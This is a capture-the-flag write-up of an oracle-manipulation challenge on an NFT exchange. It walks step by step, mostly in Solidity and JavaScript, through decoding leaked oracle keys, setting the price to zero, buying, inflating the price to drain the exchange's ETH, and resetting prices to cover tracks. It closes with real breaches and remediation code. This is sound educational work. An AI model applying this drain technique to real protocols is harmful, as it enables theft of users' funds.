# Challenge #7: Compromised

- **Difficulty**: Medium
- **Category**: Leaked Credentials
- **Severity**: Critical
- **Status**: SOLVED

## Overview

An NFT exchange allows buying and selling NFTs at a price determined by a trusted oracle. The oracle aggregates prices from three trusted sources using the median value. Two of the three oracle source private keys have been leaked — encoded as hex strings in the challenge description, which decode to base64-encoded private keys.

## Vulnerability

The vulnerability is not in the smart contract code itself but in **operational security**. Two of three trusted oracle private keys are exposed:

```
// Hex-encoded ASCII in the challenge README
4d 48 67 33 5a 44 45 31 ... -> base64 string -> private key 1
4d 48 67 33 5a 44 45 31 ... -> base64 string -> private key 2
```

With 2 of 3 oracle sources compromised, the attacker controls the median price. The oracle uses a simple median calculation:

```solidity
function _computeMedianPrice(string calldata symbol) private view returns (uint256) {
    uint256[] memory prices = _getAllPricesForSymbol(symbol);
    // Sort and return median
    if (prices.length == 3) return prices[1]; // middle value
}
```

Controlling two prices means the attacker controls the median regardless of the third source's honest report.

## Exploit Walkthrough

**Step 1**: Decode the leaked keys from hex -> ASCII -> base64 -> private key:

```javascript
// Hex to ASCII
const ascii = Buffer.from(hexString, "hex").toString("ascii");
// Base64 to bytes -> private key
const privateKey = Buffer.from(ascii, "base64").toString("hex");
```

**Step 2**: Use the two compromised oracle sources to set the NFT price to near zero:

```solidity
vm.prank(oracle1);
oracle.postPrice("DVNFT", 0);
vm.prank(oracle2);
oracle.postPrice("DVNFT", 0);
```

The median of [0, 0, honest_price] = 0.

**Step 3**: Buy an NFT at the manipulated price (essentially free):

```solidity
exchange.buyOne{value: 1}(); // Buy for 1 wei
```

**Step 4**: Manipulate the price upward to the exchange's entire ETH balance:

```solidity
vm.prank(oracle1);
oracle.postPrice("DVNFT", address(exchange).balance);
vm.prank(oracle2);
oracle.postPrice("DVNFT", address(exchange).balance);
```

**Step 5**: Sell the NFT at the inflated price:

```solidity
nft.approve(address(exchange), tokenId);
exchange.sellOne(tokenId);
```

**Step 6**: Restore oracle prices to the original value to cover tracks:

```solidity
vm.prank(oracle1);
oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
vm.prank(oracle2);
oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
```

## Real-World Impact

- **Ronin Bridge (March 2022, ~$625M)**: Attackers compromised 5 of 9 validator private keys for the Ronin sidechain bridge, enabling them to forge withdrawal transactions. The attack pattern — stealing enough signing keys to control a multi-sig or oracle consensus — is identical.
- **Harmony Bridge (June 2022, ~$100M)**: Compromised 2 of 5 multi-sig keys controlling the Horizon bridge.
- **Wintermute (September 2022, ~$160M)**: Private key compromise through a Profanity vanity address vulnerability.

## Remediation

```solidity
// Fix 1: Hardware Security Modules (HSMs) for oracle key management
// Never store private keys in plaintext, source code, or documentation

// Fix 2: Require more than simple majority for oracle consensus
uint256 constant REQUIRED_SOURCES = 3; // All 3 must agree within tolerance
require(maxPrice - minPrice <= PRICE_TOLERANCE, "Oracle prices diverge too much");

// Fix 3: Price deviation circuit breaker
uint256 lastPrice = _lastMedianPrice;
uint256 newPrice = _computeMedianPrice(symbol);
require(
    newPrice >= lastPrice * 90 / 100 && newPrice <= lastPrice * 110 / 100,
    "Price deviation exceeds 10%"
);

// Fix 4: Time-delayed price updates
mapping(bytes32 => uint256) public pendingPriceUpdates;
function postPrice(string calldata symbol, uint256 price) external onlyTrustedSource {
    pendingPriceUpdates[keccak256(abi.encode(symbol, msg.sender))] = price;
    // Effective after delay
}
```

## Key Takeaway

Credential leakage is a critical attack vector — use HSMs, never store keys in code, and design oracle systems to tolerate partial compromise.
